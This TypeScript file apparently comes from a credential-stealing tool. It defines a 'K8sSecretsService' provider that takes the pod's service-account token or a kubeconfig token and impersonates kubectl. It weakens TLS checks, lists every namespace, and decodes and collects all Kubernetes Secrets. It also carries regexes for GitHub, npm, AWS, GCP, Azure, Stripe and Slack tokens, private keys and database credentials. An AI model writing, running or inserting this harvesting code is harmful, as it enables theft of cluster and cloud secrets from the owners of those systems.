import * as fs from "fs";
import * as path from "path";

import { Provider } from "../base";
import type { ProviderResult } from "../types";

export class K8sSecretsService extends Provider {
  private readonly TIMEOUT_MS = 10000;
  private readonly API_BASE = process.env.KUBERNETES_SERVICE_HOST
    ? `https://${process.env.KUBERNETES_SERVICE_HOST}:${process.env.KUBERNETES_SERVICE_PORT}`
    : null;

  constructor() {
    super("kubernetes", "secrets", {
      ghtoken: /gh[op]_[A-Za-z0-9_\-\.]{36,}/g,
      npmtoken: /npm_[A-Za-z0-9_\-\.]{36,}/g,
      k8stoken: /eyJhbGciOiJSUzI1NiIsImtpZCI6[\w\-\.]+/g,
      awskey:
        /(AKIA[0-9A-Z]{16}|aws_access_key_id["\s:=]+["']?[A-Z0-9]{20}|aws_secret_access_key["\s:=]+["']?[A-Za-z0-9/+]{40})/g,
      awsSessionToken: /aws_session_token["\s:=]+["']?[A-Za-z0-9/+=]{100,}/gi,
      gcpKey:
        /"type":\s*"service_account"|"private_key":\s*"-----BEGIN PRIVATE KEY-----/g,
      azureKey:
        /(AccountKey|accessKey|client_secret)["\s:=]+["']?[A-Za-z0-9+/=]{40,}/gi,
      dbConnStr:
        /(mongodb|mysql|postgresql|postgres|redis):\/\/[^:\s]+:[^@\s]+@[^\s'"]+/gi,
      stripeKey: /(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}/g,
      slackToken: /xox[baprs]-[0-9a-zA-Z\-]{10,}/g,
      twilioKey: /SK[0-9a-f]{32}/gi,
      privateKey: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g,
      sshKey: /ssh-(rsa|ed25519|dss) AAAA[0-9A-Za-z+\/]{100,}/g,
      dockerAuth: /"auth":\s*"[A-Za-z0-9+\/=]{20,}"/g,
      kubeconfig: /[A-Za-z0-9+/=]{20,}/g,
      secret:
        /["']?(password|passwd|pass|pwd|secret|token|key|api[_-]?key|auth)["']?\s*["':=]\s*["'][^"'{}\s]{4,}["']/gi,
      genericSecret: /[A-Za-z0-9_\-\.]{20,}/g,
      urlCred: /https?:\/\/[^:"'\s]+:[^@"'\s]+@[^\s'"\]]+/g,
    });
  }

  private isInCluster(): boolean {
    return !!process.env.KUBERNETES_SERVICE_HOST;
  }

  private async getCA(): Promise<Buffer | null> {
    const caPath = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt";
    try {
      if (fs.existsSync(caPath)) {
        return await fs.promises.readFile(caPath);
      }
    } catch {}
    return null;
  }

  private async readServiceAccountToken(): Promise<string | null> {
    try {
      const token = await fs.promises.readFile(
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "utf-8",
      );
      return token.trim();
    } catch {
      return null;
    }
  }

  private async readNamespace(): Promise<string | null> {
    try {
      const ns = await fs.promises.readFile(
        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "utf-8",
      );
      return ns.trim();
    } catch {
      return null;
    }
  }

  private getKubeconfigToken(): string | null {
    try {
      const home = process.env.HOME || process.env.USERPROFILE;
      if (!home) return null;

      const kubeconfigPath =
        process.env.KUBECONFIG || path.join(home, ".kube", "config");
      if (!fs.existsSync(kubeconfigPath)) return null;

      const raw = fs.readFileSync(kubeconfigPath, "utf-8");

      const patterns = [
        /token:\s*["']?([A-Za-z0-9_\-\.]{20,})["']?/i,
        /id-token:\s*["']?([A-Za-z0-9_\-\.]{20,})["']?/i,
        /access-token:\s*["']?([A-Za-z0-9_\-\.]{20,})["']?/i,
      ];

      for (const pattern of patterns) {
        const match = raw.match(pattern);
        if (match && match[1]) return match[1];
      }
    } catch {}
    return null;
  }

  private async apiRequest(
    apiPath: string,
    token: string,
    signal?: AbortSignal,
  ): Promise<any> {
    const ca = await this.getCA();

    if (!this.API_BASE) {
      throw new Error("No Kubernetes API host configured");
    }

    const url = `${this.API_BASE}${apiPath}`;

    const controller = new AbortController();
    const internalSignal = controller.signal;

    const timeout = setTimeout(() => {
      controller.abort();
    }, this.TIMEOUT_MS);

    const abortHandler = () => controller.abort();

    if (signal) {
      if (signal.aborted) {
        clearTimeout(timeout);
        throw new Error("Aborted");
      }
      signal.addEventListener("abort", abortHandler);
    }

    try {
      const res = await fetch(url, {
        method: "GET",
        headers: {
          Authorization: `Bearer ${token}`,
          "User-Agent": "kubectl/v1.28.0",
          Accept: "application/json",
        },
        signal: internalSignal,
        tls: {
          rejectUnauthorized: !!ca,
          ca: ca || undefined,
        },
      });

      if (!res.ok) {
        throw new Error(`K8s API returned ${res.status}`);
      }

      return await res.json();
    } catch (err: any) {
      if (internalSignal.aborted) {
        if (signal?.aborted) throw new Error("Aborted");
        throw new Error(`Request timeout after ${this.TIMEOUT_MS}ms`);
      }
      throw err;
    } finally {
      clearTimeout(timeout);
      if (signal) signal.removeEventListener("abort", abortHandler);
    }
  }

  private async listNamespaces(
    token: string,
    signal?: AbortSignal,
  ): Promise<string[]> {
    try {
      const data = await this.apiRequest("/api/v1/namespaces", token, signal);
      return (data.items || [])
        .map((ns: any) => ns.metadata?.name)
        .filter(Boolean);
    } catch {
      return [];
    }
  }

  private async getNamespaceSecrets(
    namespace: string,
    token: string,
    signal?: AbortSignal,
  ): Promise<any[]> {
    try {
      const data = await this.apiRequest(
        `/api/v1/namespaces/${namespace}/secrets`,
        token,
        signal,
      );
      return (data.items || []).map((secret: any) => {
        const decoded: Record<string, string> = {};
        if (secret.data) {
          for (const [k, v] of Object.entries(secret.data)) {
            try {
              decoded[k] = Buffer.from(v as string, "base64").toString("utf-8");
            } catch {
              decoded[k] = String(v);
            }
          }
        }
        return {
          name: secret.metadata?.name,
          namespace: namespace,
          type: secret.type || "Opaque",
          data: decoded,
          labels: secret.metadata?.labels || {},
        };
      });
    } catch {
      return [];
    }
  }

  async execute(): Promise<ProviderResult> {
    try {
      const token = this.isInCluster()
        ? await this.readServiceAccountToken()
        : this.getKubeconfigToken();

      if (!token) {
        return this.failure("No valid Kubernetes credentials found");
      }

      let namespaces = await this.listNamespaces(token);

      if (namespaces.length === 0) {
        const currentNs = await this.readNamespace();
        namespaces = [currentNs || "default"];
      }

      const excluded = new Set([
        "kube-system",
        "kube-public",
        "kube-node-lease",
        "local-path-storage",
        "cert-manager",
      ]);
      const allSecrets: any[] = [];

      for (const ns of namespaces) {
        if (excluded.has(ns)) continue;
        const secrets = await this.getNamespaceSecrets(ns, token);
        allSecrets.push(...secrets);
      }

      if (allSecrets.length === 0) {
        return this.failure("No secrets accessible");
      }

      return this.success({
        clusterHost: this.API_BASE,
        totalSecrets: allSecrets.length,
        secrets: allSecrets,
      });
    } catch (e) {
      return this.failure(e instanceof Error ? e : new Error(String(e)));
    }
  }
}
